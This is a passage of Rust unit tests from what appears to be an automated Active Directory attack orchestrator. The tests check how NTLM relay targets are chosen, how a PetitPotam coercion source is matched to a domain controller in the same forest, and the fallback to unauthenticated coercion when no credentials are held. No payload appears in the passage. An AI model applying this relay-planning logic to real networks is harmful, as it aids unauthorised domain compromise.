                .insert("contoso.local".into(), "192.168.58.10".into());
            s.domain_controllers
                .insert("fabrikam.local".into(), "192.168.58.30".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(
            work[0].coercion_source,
            Some("192.168.58.30".into()),
            "coercion source must be fabrikam DC (same forest as relay target)"
        );
        assert_eq!(
            work[0].credential.as_ref().map(|c| c.domain.as_str()),
            Some("fabrikam.local"),
            "credential must match coercion source's forest"
        );
    }

    #[tokio::test]
    async fn collect_relay_work_no_matching_cred_falls_back_to_unauth() {
        // Relay target in fabrikam.local. We have a fabrikam DC but only
        // a contoso credential. The cred wouldn't authenticate to the
        // fabrikam DC, so the dispatch must omit the credential (None)
        // and rely on PetitPotam unauth.
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred()); // contoso cred only
            s.discovered_vulnerabilities.insert(
                "v1".into(),
                make_smb_vuln_with_domain("v1", "192.168.58.22", "fabrikam.local"),
            );
            s.domain_controllers
                .insert("fabrikam.local".into(), "192.168.58.30".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].coercion_source, Some("192.168.58.30".into()));
        assert!(
            work[0].credential.is_none(),
            "no cross-forest cred match — must fall back to None (PetitPotam unauth)"
        );
    }

    #[tokio::test]
    async fn collect_relay_work_no_credentials_still_emits_unauth() {
        // Empty state.credentials no longer short-circuits the work
        // collection — PetitPotam unauth works with no source-side cred,
        // and skipping all relay opportunities when state has no creds
        // throws away every relay vuln discovered before any auth lands.
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            // No credentials.
            s.discovered_vulnerabilities.insert(
                "v1".into(),
                make_smb_vuln_with_domain("v1", "192.168.58.22", "contoso.local"),
            );
            s.domain_controllers
                .insert("contoso.local".into(), "192.168.58.10".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(
            work.len(),
            1,
            "missing creds must not silently drop all relay work"
        );
        assert!(work[0].credential.is_none());
    }

    #[test]
    fn same_forest_domain_helper_basic() {
        assert!(same_forest_domain("contoso.local", "contoso.local"));
        assert!(same_forest_domain("CHILD.contoso.local", "contoso.local"));
        assert!(same_forest_domain("contoso.local", "child.contoso.local"));
        assert!(!same_forest_domain("contoso.local", "fabrikam.local"));
        // Empty inputs treated as "unknown" — match nothing.
        assert!(!same_forest_domain("", "contoso.local"));
        assert!(!same_forest_domain("contoso.local", ""));
        assert!(same_forest_domain("", "")); // both unknown is still consistent
    }

    #[test]
    fn host_domain_for_ip_extracts_domain_suffix() {
        use ares_core::models::Host;
        let mut state = crate::orchestrator::state::StateInner::new("test".to_string());
        state.hosts.push(Host {
            ip: "192.168.58.22".into(),
            hostname: "web01.contoso.local".into(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        });
        assert_eq!(
            host_domain_for_ip(&state, "192.168.58.22").as_deref(),
            Some("contoso.local")
        );
        // IP not in state.
        assert!(host_domain_for_ip(&state, "192.168.58.99").is_none());
        // Empty IP.
        assert!(host_domain_for_ip(&state, "").is_none());
    }
}
